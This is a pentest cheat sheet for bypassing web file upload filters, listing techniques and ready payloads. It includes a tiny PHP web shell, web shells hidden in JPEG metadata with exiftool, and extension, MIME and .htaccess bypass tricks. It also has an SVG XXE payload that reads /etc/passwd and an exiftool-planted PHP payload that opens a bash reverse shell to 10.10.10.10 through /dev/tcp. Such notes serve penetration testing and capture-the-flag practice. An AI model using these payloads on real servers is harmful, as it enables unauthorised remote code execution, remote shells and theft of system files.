# File Upload Bypass

## Client-side filter bypass

```
# Send a request that meets client-side check, then capture it with BurpSuite and modify the content-type and file extension. 
```

## MIME type bypass&#x20;

```
# Intercept POST request with BurpSuite, change Content-Type from application/x-php to image/png or image/jpeg.

```


## Content-Length bypass

```
# If the web server checks the size of file uploaded we can upload a very small web shell to gain execution. The PHP web shell below is only 15 bytes
<?=`$_GET[x]`?>
```

## PHP getimagesize() bypass

```
# We can attempt to bypass getimagesize function call by placing a web shell inside an jpg comment with exiftool. 
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
mv file.jpg file.php.jpg
```

### Magic byte forgery

```
# Attempt to add valid GIF magic bytes to beginning of php web shell: GIF89a;,GIF8;, or GIF98
```

## File extension bypass - BlackListing

```
# Try other valid file extensions such as .php5, .phar, and .phtml

# Bypass case sensitive filter with uppercase letters: pHP, .pHP5, .PhAr 

# Upload a .htaccess file to add a new PHP extension - Apache
AddType application/x-httpd-php .shell

# The following options must be enabled to upload/modify .htaccess files 
/etc/apache2/apache2.conf:      AllowOverride Options
/etc/apache2/apache2.conf:      AllowOverride FileInfo

# Upload a Web.config file to gain execution - IIS 
Example - https://0xdf.gitlab.io/2018/10/27/htb-bounty.html

```

## File extension bypass - WhiteListing

```
# Bypass with special characters after file extension :'%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' 'â€¦' ':'

# Bypass using double extension 
cmd.phar.png, cmd.phar:.png, or cmd.phar;.png
```

## XXE inside SVG

```
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://cat /etc/passwd"></image>
</svg>
```

## Reverse Shell via ExifTool

```
exiftool -DocumentName="<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/10.10.10.10/443 0>&1'\"); ?>" hackerman.jpeg
mv hackerman.jpeg hackerman.php.jpeg
```

url="https://www.onsecurity.io/blog/file-upload-checklist/"

url="http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html"

url="https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/"